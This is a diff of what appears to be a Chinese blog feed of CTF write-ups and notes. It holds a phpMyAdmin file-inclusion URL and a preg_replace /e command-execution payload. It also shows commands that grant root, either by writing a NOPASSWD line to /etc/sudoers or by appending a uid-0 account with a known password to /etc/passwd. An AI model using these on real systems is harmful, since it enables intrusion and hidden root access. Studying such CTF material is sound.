@@ -529,6 +529,15 @@
 
 <p>只要不传入 flag 参数就会把 $yds 给打印出来，此时 $yds 已经等于 $flag 了，所以会把 flag 给打印出来</p>
 <h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p><strong>phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞</strong><br><a href="http://4208ab9f-7d19-4f71-a05d-5ad5c79f5850.node3.buuoj.cn/phpmyadmin?target=db_datadict.php%25253f/../../../../../../../../flag">http://4208ab9f-7d19-4f71-a05d-5ad5c79f5850.node3.buuoj.cn/phpmyadmin?target=db_datadict.php%253f/../../../../../../../../flag</a></p>
+<h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>一开始伪协议读出 next.php 源码，然后 <a href="https://www.yuque.com/hxfqg9/web/igzkae#xw9Pe" target="_blank" rel="noopener">preg_replace /e</a> 命令执行<br>next.php?\S*={${getFlag()}}&amp;cmd=system(‘cat /flag’);</p>
+<h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>XFF 存在模版注入</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1601874867582-e0f46d37-1ee5-4922-9b00-be555bae6f53.png#align=left&display=inline&height=267&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=1262&size=79292&status=done&style=stroke&width=631" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
 ]]></content>
   </entry>
   <entry>
@@ -7015,6 +7024,7 @@
 </ul>
 <h2 id="写-etc-sudoers"><a href="#写-etc-sudoers" class="headerlink" title="写/etc/sudoers"></a>写/etc/sudoers</h2><p>这个东西的作用是当用户执行 sudo 的时候，会先到这里面去找，如果发现用户有 sudo 的权限就能直接以 root 的权限来执行命令<br>文件内容公式：<code>授权用户/组 主机=[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2...</code><br>那么可以往里写 <code>yichen ALL=(ALL:ALL) ALL</code> 这样 yichen 就能通过 sudo 来执行 root 权限<br>又或者 peter 可以不使用密码用 sudo 执行任何命令 <code>peter ALL=(ALL) NOPASSWD: ALL</code></p>
 <h2 id="写-etc-passwd"><a href="#写-etc-passwd" class="headerlink" title="写/etc/passwd"></a>写/etc/passwd</h2><p>首先要生成 hash<br><code>openssl passwd -1 -salt yichen 123456</code><br>用户名：yichen，密码：123456<br><code>echo &#39;yichen:$1$yichen$6nzFZVX5T21iu2AmBgzin/:0:0:yichen:/root:/bin/bash&#39; &gt;&gt; /etc/passwd</code><br>然后 su yichen，输入密码：123456 就拿到 root 权限了</p>
+<h1 id="重要-敏感文件"><a href="#重要-敏感文件" class="headerlink" title="重要/敏感文件"></a>重要/敏感文件</h1><h2 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h2><p>配置文件存放目录：/etc/nginx<br>主配置文件：/etc/nginx/conf/nginx.conf 或 /etc/nginx/nginx.conf<br>管理脚本：/usr/lib64/systemd/system/nginx.service<br>模块：/usr/lisb64/nginx/modules<br>应用程序：/usr/sbin/nginx<br>程序默认存放位置：/usr/share/nginx/html<br>日志默认存放位置：/var/log/nginx</p>
 ]]></content>
   </entry>
   <entry>
